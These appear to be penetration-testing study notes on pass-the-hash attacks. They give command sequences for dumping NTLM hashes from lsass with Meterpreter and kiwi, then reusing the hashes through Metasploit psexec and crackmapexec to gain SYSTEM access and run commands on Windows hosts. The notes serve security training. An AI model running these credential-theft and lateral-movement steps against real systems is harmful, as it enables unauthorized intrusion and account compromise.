## Pass-the-Hash Attack

**What is it?**

- Using a captured NTLM hash to authenticate with a target — without knowing the actual password
- Works via SMB protocol
- Hash = almost as good as a clear-text password

**Why is it useful?**

- Original exploit got patched? Still have access via hash
- Service disabled or firewall blocked? Hash still works
- Provides **persistence** — alternate access method that doesn't rely on a vulnerable service

**Tools**

|Tool|Notes|
|---|---|
|MSF `psexec` module|Needs LM + NTLM hash both|
|`crackmapexec smb`|NTLM hash alone is enough|

## Commands

**Step 1 — Get initial access + dump hashes (from previous topic)**

```bash
# Exploit BadBlue → migrate to lsass → load kiwi
pgrep lsass
migrate <PID>
load kiwi
lsa_dump_sam        # copy administrator NTLM hash
```

**Step 2 — Get LM + NTLM hash (needed for MSF psexec)**

```bash
hashdump
# Output format: username:SID:LM_hash:NTLM_hash
# Copy full LM:NTLM string
```

---

### Method 1 — Metasploit PsExec

```bash
search psexec
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set LPORT 4422           # different port — session 1 already using 4444
set SMBUser administrator
set SMBPass <LM_hash>:<NTLM_hash>
set target 2             # Native upload
exploit
```

**Verify**

```bash
sysinfo
getuid               # NT AUTHORITY\SYSTEM
```

---

### Method 2 — CrackMapExec

```bash
crackmapexec smb <TARGET_IP> -u administrator -H <NTLM_hash>
# Pwn3d! = success

# Execute commands
crackmapexec smb <TARGET_IP> -u administrator -H <NTLM_hash> -x whoami
crackmapexec smb <TARGET_IP> -u administrator -H <NTLM_hash> -x ipconfig
```

---

**⚠️ Key Points**

- MSF psexec needs `-H LM:NTLM` format, crackmapexec needs `-H NTLM` only
- Works even after killing original session — hash alone is enough
- No need to crack the hash — use it directly
- Don't change user passwords during a real pentest — breaks production
